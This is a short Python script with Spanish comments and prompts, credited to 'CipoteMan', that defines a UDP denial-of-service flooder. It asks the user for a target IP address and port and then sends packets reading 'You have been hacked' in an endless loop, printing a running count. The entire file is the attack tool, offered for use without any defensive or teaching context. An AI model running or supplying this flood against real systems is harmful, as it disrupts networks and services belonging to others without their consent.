#Creado por CipoteMan
### -*- coding: utf-8 -*-

import socket

class dos():

    def udp(self):

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0
        ip = input("Escribe la dirección ip: ")
        puerto = int(input("Escribe el puerto: "))

        while True:
            s.sendto ("You have been hacked".encode(), (ip, puerto))
            sent = sent + 1
            print ("{} paquetes enviados".format(sent))

dos = dos()
